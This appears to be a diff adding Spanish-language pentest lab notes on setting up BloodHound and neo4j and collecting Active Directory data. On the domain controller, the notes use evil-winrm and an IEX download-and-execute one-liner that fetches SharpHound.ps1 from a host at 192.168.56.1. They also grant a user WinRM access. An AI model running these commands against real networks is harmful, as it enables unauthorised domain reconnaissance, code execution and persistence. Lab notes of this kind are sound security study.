@@ -1,0 +1,28 @@
+Instalar Bloodhound y neo4j:
+    - sudo apt-get install bloodhound -y 
+    - sudo apt install neoj4 -y 
+
+Configurar neo4j:
+    - neo4j console 
+    - Abrirlo en el navegador (http://localhost:7474 -> esta url aparece en el output de la consola)
+    - Poner lo siguiente en la linea de comandos, arriba del todo: :server change-password y cambiar password 
+
+Bloodhound:
+    - Ejecutar bloodhound en la consola.
+    - En la ventana emergente, poner las credenciales del neo4j.
+
+
+Comandos:
+
+Crear data (.zip) y subirlo al bloodhound: 
+    - Descargar SharpHound.ps1 de github: wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
+    - Evil-wirm al DC. 
+    - IEX(New-Object Net.WebClient).downloadString('http://192.168.56.1:8000/SharpHound.ps1')
+    - Invoke-BloodHound -CollectionMethod All
+    - Nos descargamos el zip -> download file.zip 
+    - Y subimos este zip al bloodhound, en la interfaz a la derecha hay un boton que pone: Upload Data 
+
+
+WinServer1:
+    - Añadir usuario winrm:
+        net localgroup "Remote Management Users" $username1 /add
